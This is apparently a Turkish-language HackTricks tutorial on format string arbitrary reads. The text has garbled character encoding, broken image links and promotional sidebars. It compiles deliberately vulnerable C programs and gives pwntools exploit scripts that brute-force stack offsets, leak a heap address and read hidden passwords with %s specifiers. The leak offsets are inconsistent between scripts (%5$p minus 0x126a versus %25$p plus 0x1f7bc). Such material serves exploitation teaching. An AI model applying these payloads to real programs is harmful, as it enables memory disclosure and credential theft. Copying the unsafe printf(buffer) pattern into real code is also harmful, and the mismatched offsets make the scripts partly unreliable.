# Format Strings - Rastgele Okuma Ã–rneÄŸi

<details>

<summary><strong>SÄ±fÄ±rdan Kahramana AWS hacklemeyi Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**]'na(https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking hilelerinizi paylaÅŸarak PR gÃ¶ndererek HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

## Ä°kili Okumaya BaÅŸla

### Kod
```c
#include <stdio.h>

int main(void) {
char buffer[30];

fgets(buffer, sizeof(buffer), stdin);

printf(buffer);
return 0;
}
```
Derleyin:
```python
clang -o fs-read fs-read.c -Wno-format-security -no-pie
```
### SÄ±zma
```python
from pwn import *

p = process('./fs-read')

payload = f"%11$s|||||".encode()
payload += p64(0x00400000)

p.sendline(payload)
log.info(p.clean())
```
* **Ofset 11'dir** Ã§Ã¼nkÃ¼ birkaÃ§ As ayarlayarak ve bir dÃ¶ngÃ¼ ile 0'dan 50'ye kadar ofsetleri **brute-force** ederek, ofset 11'de ve 5 ekstra karakterle (bizim durumumuzda borular `|`) tam bir adresi kontrol etmek mÃ¼mkÃ¼ndÃ¼r.
* Adresin tamamÄ± 0x4141414141414141 olduÄŸunda **`%11$p`**'yi kullandÄ±m.
* **Format dizesi yÃ¼kÃ¼, adresin Ã–NCESÄ°NDE** olmalÄ±dÄ±r Ã§Ã¼nkÃ¼ **printf, bir null bayta kadar okuma yapar**, bu yÃ¼zden adresi gÃ¶nderir ve ardÄ±ndan format dizesini gÃ¶nderirsek, printf, null baytÄ± bulacaÄŸÄ±ndan format dizesine asla ulaÅŸamaz.
* SeÃ§ilen adres 0x00400000'dir Ã§Ã¼nkÃ¼ bu, ikili dosyanÄ±n baÅŸladÄ±ÄŸÄ± yerdir (PIE yoktur)

<figure><img src="broken-reference" alt="" width="477"><figcaption></figcaption></figure>

## ParolalarÄ± Oku
```c
#include <stdio.h>
#include <string.h>

char bss_password[20] = "hardcodedPassBSS"; // Password in BSS

int main() {
char stack_password[20] = "secretStackPass"; // Password in stack
char input1[20], input2[20];

printf("Enter first password: ");
scanf("%19s", input1);

printf("Enter second password: ");
scanf("%19s", input2);

// Vulnerable printf
printf(input1);
printf("\n");

// Check both passwords
if (strcmp(input1, stack_password) == 0 && strcmp(input2, bss_password) == 0) {
printf("Access Granted.\n");
} else {
printf("Access Denied.\n");
}

return 0;
}
```
Derleyin:
```bash
clang -o fs-read fs-read.c -Wno-format-security
```
### Stack'ten Okuma

**`stack_password`** yerel bir deÄŸiÅŸken olduÄŸundan dolayÄ± stack'te saklanacaktÄ±r, bu yÃ¼zden sadece printf'i kÃ¶tÃ¼ye kullanarak stack'in iÃ§eriÄŸini gÃ¶stermek yeterli olacaktÄ±r. Bu, yÄ±ÄŸÄ±n Ã¼zerindeki ÅŸifreleri sÄ±zdÄ±rmak iÃ§in ilk 100 pozisyonu sÄ±zdÄ±rmak iÃ§in bir saldÄ±rÄ±dÄ±r:
```python
from pwn import *

for i in range(100):
print(f"Try: {i}")
payload = f"%{i}$s\na".encode()
p = process("./fs-read")
p.sendline(payload)
output = p.clean()
print(output)
p.close()
```
Resimde, ÅŸifrenin yÄ±ÄŸÄ±n iÃ§inde `10.` konumdan sÄ±zdÄ±rÄ±labileceÄŸi gÃ¶rÃ¼lebilir:

<figure><img src="../../.gitbook/assets/image (1234).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1233).png" alt="" width="338"><figcaption></figcaption></figure>

### Veri Okuma

AynÄ± saldÄ±rÄ±yÄ± Ã§alÄ±ÅŸtÄ±rarak ancak `%s` yerine `%p` kullanarak yÄ±ÄŸÄ±ndan bir yÄ±ÄŸÄ±n adresi sÄ±zdÄ±rmak mÃ¼mkÃ¼ndÃ¼r ve bu `%25$p` konumunda gerÃ§ekleÅŸir. DahasÄ±, sÄ±zdÄ±rÄ±lan adresin (`0xaaaab7030894`) o iÅŸlemde bellekteki ÅŸifrenin konumuyla karÅŸÄ±laÅŸtÄ±rarak adres farkÄ±nÄ± elde edebiliriz:

<figure><img src="broken-reference" alt="" width="563"><figcaption></figcaption></figure>

Åimdi yÄ±ÄŸÄ±nda bir adresi kontrol etmek ve ikinci format dizesi gÃ¼venlik aÃ§Ä±ÄŸÄ±ndan eriÅŸmek iÃ§in nasÄ±l kontrol edileceÄŸini bulma zamanÄ±:
```python
from pwn import *

def leak_heap(p):
p.sendlineafter(b"first password:", b"%5$p")
p.recvline()
response = p.recvline().strip()[2:] #Remove new line and "0x" prefix
return int(response, 16)

for i in range(30):
p = process("./fs-read")

heap_leak_addr = leak_heap(p)
print(f"Leaked heap: {hex(heap_leak_addr)}")

password_addr = heap_leak_addr - 0x126a

print(f"Try: {i}")
payload = f"%{i}$p|||".encode()
payload += b"AAAAAAAA"

p.sendline(payload)
output = p.clean()
print(output.decode("utf-8"))
p.close()
```
Ve **try 14**'te kullanÄ±lan geÃ§iÅŸle bir adresi kontrol edebileceÄŸimizi gÃ¶rmek mÃ¼mkÃ¼ndÃ¼r:

<figure><img src="broken-reference" alt="" width="563"><figcaption></figcaption></figure>

### SÄ±zma
```python
from pwn import *

p = process("./fs-read")

def leak_heap(p):
# At offset 25 there is a heap leak
p.sendlineafter(b"first password:", b"%25$p")
p.recvline()
response = p.recvline().strip()[2:] #Remove new line and "0x" prefix
return int(response, 16)

heap_leak_addr = leak_heap(p)
print(f"Leaked heap: {hex(heap_leak_addr)}")

# Offset calculated from the leaked position to the possition of the pass in memory
password_addr = heap_leak_addr + 0x1f7bc

print(f"Calculated address is: {hex(password_addr)}")

# At offset 14 we can control the addres, so use %s to read the string from that address
payload = f"%14$s|||".encode()
payload += p64(password_addr)

p.sendline(payload)
output = p.clean()
print(output)
p.close()
```
<figure><img src="broken-reference" alt="" width="563"><figcaption></figcaption></figure>

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olmaya kadar AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **ğŸ’¬ [**Discord grubumuza**](https://discord.gg/hRep4RUj7f) katÄ±lÄ±n veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)'da takip edin**.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR gÃ¶ndererek HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
